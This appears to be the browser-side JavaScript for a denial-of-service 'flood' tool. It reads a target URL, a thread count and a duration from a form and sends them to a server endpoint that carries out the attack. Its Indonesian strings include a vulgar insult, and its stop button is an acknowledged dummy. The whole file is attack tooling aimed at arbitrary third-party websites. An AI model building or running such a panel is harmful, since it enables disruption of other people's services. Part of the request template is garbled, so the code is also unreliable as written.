const startBtn = document.getElementById('startBtn');
const stopBtn = document.getElementById('stopBtn');
const log = document.getElementById('log');

let attacking = false;

startBtn.onclick = async () => {
  if (attacking) return;
  const url = document.getElementById('target').value;
  const threads = document.getElementById('threads').value;
  const duration = document.getElementById('duration').value;

  if (!url) return alert("Masukin target dulu kontol!");

  attacking = true;
  startBtn.disabled = true;
  stopBtn.disabled = false;
  log.innerHTML += '<br>ATTACKING...';

  try {
    const res = await fetch(`/api/flood?url=\( {encodeURIComponent(url)}&threads= \){threads}&duration=${duration}`);
    const data = await res.json();
    log.innerHTML += `<br>${JSON.stringify(data, null, 2)}`;
  } catch (e) {
    log.innerHTML += `<br>Error: ${e}`;
  }

  attacking = false;
  startBtn.disabled = false;
  stopBtn.disabled = true;
};

stopBtn.onclick = () => {
  // Kalau mau stop real, butuh websocket atau signal, dummy dulu
  log.innerHTML += '<br>Stopped (dummy)';
};